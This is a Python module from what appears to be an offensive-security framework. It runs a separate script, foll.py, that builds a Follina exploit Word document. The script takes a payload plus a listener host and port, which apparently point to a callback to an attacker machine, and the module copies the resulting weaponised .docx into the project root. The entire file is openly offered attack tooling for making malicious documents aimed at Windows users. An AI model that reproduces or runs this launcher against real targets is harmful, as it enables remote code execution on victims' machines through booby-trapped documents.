import subprocess
import shutil
import os
from pathlib import Path
from typing import Dict, Any
from colorama import Fore, Style

class BaseModule:
    def __init__(self):
        self.options = {}
        self.required_options = []
        
    def validate_options(self) -> tuple[bool, str]:
        for opt in self.required_options:
            if not self.get_option(opt):
                return False, f"Required option missing: {opt}"
        return True, ""
    
    def get_option(self, key: str):
        return self.options.get(key.upper(), "")

class Follina_Exploit(BaseModule):
    def __init__(self):
        super().__init__()
        self.description = "Run foll.py with options and copy produced docx to project root"
        self.module_type = "auxiliary"
        self.options = {
            "FOLL_PATH": "./modules/exploits/foll.py",
            "PYTHON": "python",
            "PAYLOAD": "",
            "LHOST": "",
            "LPORT": "",
            "OUTPUT": "foll.docx",
            "TIMEOUT": "300",
        }
        self.required_options = ["PAYLOAD", "LHOST", "LPORT"]

    def _sanitize_filename(self, filename: str) -> str:
        return os.path.basename(filename)

    def _resolve_project_root(self) -> Path:
        return Path(__file__).resolve().parents[2]

    def run(self) -> Dict[str, Any]:
        ok, msg = self.validate_options()
        if not ok:
            print(f"{Fore.RED}[!] {msg}{Style.RESET_ALL}")
            return {"success": False, "message": msg}

        foll_path_opt = self.get_option("FOLL_PATH") or "foll.py"
        python_bin = self.get_option("PYTHON") or "python"
        pay = str(self.get_option("PAYLOAD"))
        lhost = str(self.get_option("LHOST"))
        lport = str(self.get_option("LPORT"))
        outfile_opt = str(self.get_option("OUTPUT") or "foll.docx")
        try:
            timeout = float(self.get_option("TIMEOUT") or 300)
        except Exception:
            timeout = 300.0

        outfile_name = self._sanitize_filename(outfile_opt)
        project_root = self._resolve_project_root()

        foll_path = Path(foll_path_opt)
        if not foll_path.is_absolute():
            cand = project_root.joinpath(foll_path_opt)
            if cand.exists():
                foll_path = cand
            else:
                foll_path = Path(foll_path_opt).resolve()

        if not foll_path.exists():
            msg = f"foll.py not found at: {foll_path}"
            print(f"{Fore.RED}[!] {msg}{Style.RESET_ALL}")
            return {"success": False, "message": msg}

        cmd = [
            str(python_bin),
            str(foll_path),
            "-c", pay,
            "-o", outfile_name,
            "-i", lhost,
            "-p", lport
        ]

        print(f"{Fore.YELLOW}[*] Running: {' '.join(cmd)}{Style.RESET_ALL}")
        try:
            completed = subprocess.run(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                cwd=str(project_root),
                timeout=timeout,
                text=True
            )
        except subprocess.TimeoutExpired:
            msg = f"Process timed out after {timeout} seconds"
            print(f"{Fore.RED}[!] {msg}{Style.RESET_ALL}")
            return {"success": False, "message": msg}
        except FileNotFoundError as e:
            msg = f"Interpreter not found: {python_bin} ({e})"
            print(f"{Fore.RED}[!] {msg}{Style.RESET_ALL}")
            return {"success": False, "message": msg}
        except Exception as e:
            msg = f"Error launching process: {e}"
            print(f"{Fore.RED}[!] {msg}{Style.RESET_ALL}")
            return {"success": False, "message": msg}

        if completed.stdout:
            print(f"{Fore.CYAN}[stdout]{Style.RESET_ALL}\n{completed.stdout}")
        if completed.stderr:
            print(f"{Fore.RED}[stderr]{Style.RESET_ALL}\n{completed.stderr}")

        if completed.returncode != 0:
            msg = f"Process exited with code {completed.returncode}"
            print(f"{Fore.RED}[!] {msg}{Style.RESET_ALL}")
            return {
                "success": False,
                "message": msg,
                "returncode": completed.returncode,
                "stdout": completed.stdout,
                "stderr": completed.stderr
            }

        produced_file = project_root.joinpath(outfile_name)
        if not produced_file.exists():
            alt = Path.cwd().joinpath(outfile_name)
            if alt.exists():
                produced_file = alt
            else:
                msg = f"Expected output file not found: {outfile_name}"
                print(f"{Fore.RED}[!] {msg}{Style.RESET_ALL}")
                return {
                    "success": False,
                    "message": msg,
                    "stdout": completed.stdout,
                    "stderr": completed.stderr
                }

        dest_dir = project_root
        dest_path = dest_dir.joinpath(outfile_name)
        try:
            if produced_file.resolve() != dest_path.resolve():
                shutil.copy2(str(produced_file), str(dest_path))
                print(f"{Fore.GREEN}[+] Copied {produced_file} -> {dest_path}{Style.RESET_ALL}")
            else:
                print(f"{Fore.GREEN}[+] Output file already at {dest_path}{Style.RESET_ALL}")
        except Exception as e:
            msg = f"Failed to copy output file: {e}"
            print(f"{Fore.RED}[!] {msg}{Style.RESET_ALL}")
            return {"success": False, "message": msg}

        return {
            "success": True,
            "message": "Process completed and output copied",
            "output_path": str(dest_path),
            "stdout": completed.stdout,
            "stderr": completed.stderr
        }
